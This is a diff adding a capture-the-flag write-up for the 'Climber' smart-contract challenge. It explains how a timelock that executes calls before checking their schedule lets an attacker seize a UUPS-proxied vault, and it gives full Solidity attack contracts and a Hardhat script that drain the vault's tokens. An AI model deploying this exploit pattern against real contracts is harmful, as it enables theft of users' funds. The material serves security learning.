@@ -960,3 +960,163 @@ it('Exploit', async function () {
   await attackContract.exploit(users, setupData);
 });
 ```
+
+For the last challenge we have the Climber. It's not easy, but we'll get through it. Alright, let's see the code. We have **ClimberVault.sol** contract that acts as a vault that can distribute tokens to given address (maximum 1 ether every 15 days). But, you can call the function only if you are the owner of the contract. The real owner is actually **ClimberTimelock.sol** contract. Besides from that the vault has `sweepFunds()` function that allows you to sweep all the funds, but only if you have the sweeper role. Sweeper and Owner are set in constructor (initializer). It's worth noting that this challenge is another proxy design pattern called UUPS. All this means is that proxy owner upgradeability functinoalities are stored inside implementation contract.
+
+Now the **ClimberTimelock.sol** contract. There is no obvious entry inside the vault contract so let's look at the owner contract. It looks like it can execute transactions that can be scheduled only by proposer role. It uses role based access control and we as attacker don't have any roles. `execute()` is the only function that we can access, it executes scheduled transaction, but how we execute anything if we can't schedule it? Well the vulnerability is actually a common violation of check-effect-interaction function design. You can notice that `execute()` first executes transaction and only then it checks if it was scheduled.
+
+We can take advantage of this by getting basically inside the function, running some transactions and the only key is that one of those transaction has to actually schedule all of them. This way we will pass the requirement:
+
+```solidity
+require(getOperationState(id) == OperationState.ReadyForExecution);
+```
+
+There are couple of things we need to do in order to pass as well. Delay for transaction from being scheduled to being executed must be 0, we can set it using `updateDelay()` function. For calling the `schedule()` we need proposer role so we have to grant us that role using `grantRole()`. This is possible because the timelock contract will call itself, msg.sender will actually be the **ClimberTimelock.sol** which has owner role granted by itself in constructor.
+
+Now the exact steps for the exploit are following. First we will make new **ClimberAttack.sol** contract. We will setup all neccessary calls inside it. Firstly we update delay to 0 and grant us the proposer role. After that we transfer ownership of vault to us and schedule all calls so transaction goes through. This way we are the owner of the vault. Now we can upgrade the implementation logic of proxy to new malicous vault. For that we will create our **VaultUpgradedAttack.sol** contract. Since there is no way to grant ourselves the sweeper role, we can just set `sweepFunds` modifier to `onlyOwner` and that will allow us to call it. After carefully matching state variables with proxy, we just need to add empty `_authorizeUpgrade()` function because override is required for virtual functions.
+
+Solution code:
+
+**ClimberAttack.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IClimberTimelock {
+    function execute(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] calldata dataElements,
+        bytes32 salt
+    ) external payable;
+
+    function schedule(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] calldata dataElements,
+        bytes32 salt
+    ) external;
+}
+
+contract ClimberAttack {
+    address[] private targets;
+    uint256[] private values;
+    bytes[] private dataElements;
+    bytes32 private salt;
+    IClimberTimelock private timelock;
+    address private vault;
+    address private attacker;
+
+    constructor(address _timelock, address _vault, address _attacker) {
+        timelock = IClimberTimelock(_timelock);
+        vault = _vault;
+        attacker = _attacker;
+    }
+
+    function attack() external {
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
+        );
+
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature(
+                "grantRole(bytes32,address)",
+                keccak256("PROPOSER_ROLE"),
+                address(this)
+            )
+        );
+
+        targets.push(address(vault));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("transferOwnership(address)", attacker)
+        );
+
+        targets.push(address(this));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("schedule()"));
+
+        salt = keccak256("SALT");
+
+        timelock.execute(targets, values, dataElements, salt);
+    }
+
+    function schedule() public {
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
+```
+
+**VaultUpgradedAttack.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract VaultUpgradedAttack is
+    Initializable,
+    OwnableUpgradeable,
+    UUPSUpgradeable
+{
+    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
+    uint256 public constant WAITING_PERIOD = 15 days;
+
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    function initialize() external initializer {
+        __Ownable_init();
+        __UUPSUpgradeable_init();
+    }
+
+    function sweepFunds(address tokenAddress) external onlyOwner {
+        IERC20 token = IERC20(tokenAddress);
+        require(
+            token.transfer(msg.sender, token.balanceOf(address(this))),
+            "Failed transfer"
+        );
+    }
+
+    function _authorizeUpgrade(
+        address newImplementation
+    ) internal override onlyOwner {}
+}
+```
+
+**climber.challenge.js**
+
+```js
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const VaultUpgradedAttackFactory = await ethers.getContractFactory(
+    'VaultUpgradedAttack',
+    attacker
+  );
+  const ClimberAttackFactory = await ethers.getContractFactory(
+    'ClimberAttack',
+    attacker
+  );
+  const climberAttackContract = await ClimberAttackFactory.deploy(
+    this.timelock.address,
+    this.vault.address,
+    attacker.address
+  );
+
+  await climberAttackContract.connect(attacker).attack();
+  const compromisedVault = await upgrades.upgradeProxy(
+    this.vault.address,
+    VaultUpgradedAttackFactory
+  );
+  await compromisedVault.connect(attacker).sweepFunds(this.token.address);
+});
+```
